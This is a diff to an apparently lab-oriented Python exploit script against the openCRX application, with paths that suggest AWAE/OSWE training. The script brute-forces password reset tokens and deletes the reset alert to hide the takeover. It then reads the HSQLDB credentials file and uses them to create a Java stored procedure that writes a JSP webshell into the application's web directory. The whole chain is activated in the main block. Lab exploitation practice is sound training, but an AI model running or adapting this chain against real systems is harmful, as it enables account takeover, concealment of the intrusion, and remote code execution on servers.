@@ -4,6 +4,7 @@ import re
 import json
 import subprocess
 import httpx
+import jaydebeapi
 from concurrent.futures import ThreadPoolExecutor
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 
@@ -15,7 +16,7 @@ proxy = {
 client = httpx.Client(
         verify=False,
         timeout=10.0,
-        proxies=proxy,
+#        proxies=proxy,
 )
 
 # Config
@@ -85,6 +86,8 @@ def bruteforce_tokens(username, tokens):
         if "Password successfully changed for" in res.text:
             print("[+] Successfully reset password: Awae1234!")
             return 
+    raise ValueError("Failed to reset password.")
+
 def delete_password_reset_alert(username, password):
     api_url = f"http://opencrx:8080/opencrx-rest-CRX/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/guest/alert"
     basic_cred = base64.b64encode(f"{username}:{password}".encode()).decode()
@@ -131,13 +134,43 @@ def extract_local_file(filepath):
         result = res.json()["element"][2]["parameter"]["_item"][2]["$"]
         return result.split(", ")[14]
 
+def put_webshell_via_hsqldb():
+    username = "sa"
+    password = "manager99"
+    java_class = "org.hsqldb.jdbcDriver"
+    driver_path = "./hsqldb/hsqldb-2.7.3/hsqldb/lib/hsqldb.jar"
+    database = "jdbc:hsqldb:hsql://opencrx:9001/CRX"
+
+    conn = jaydebeapi.connect(java_class,database, [username, password], jars=driver_path)
+    cursor = conn.cursor()
+
+    try:
+        cursor.execute("DROP PROCEDURE writeBytesToFilename")
+    except:
+        pass
+
+    cursor.execute("""
+        CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024)) 
+          LANGUAGE JAVA 
+          DETERMINISTIC NO SQL
+          EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
+    """)
+    path = "/home/student/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/shell.jsp"
+    hex = open("./cmdjsp.jsp", "rb").read().hex()
+    cursor.execute(f"call writeBytesToFilename('{path}', cast ('{hex}' as VARBINARY(1024)))")
+
+    cursor.close()
+    conn.close()
+
 if __name__ == "__main__":
     server = run_background_http_server()
-    #username = find_username()
-    #tokens = request_password_reset(username)
-    #bruteforce_tokens(username, tokens)
-    #delete_password_reset_alert(username, "Awae1234")
+    username = find_username()
+    tokens = request_password_reset(username)
+    bruteforce_tokens(username, tokens)
+    delete_password_reset_alert(username, "Awae1234")
     print(extract_local_file("/home/student/crx/data/hsqldb/crx.properties"))
+
+    put_webshell_via_hsqldb()
 
     server.shutdown()
 
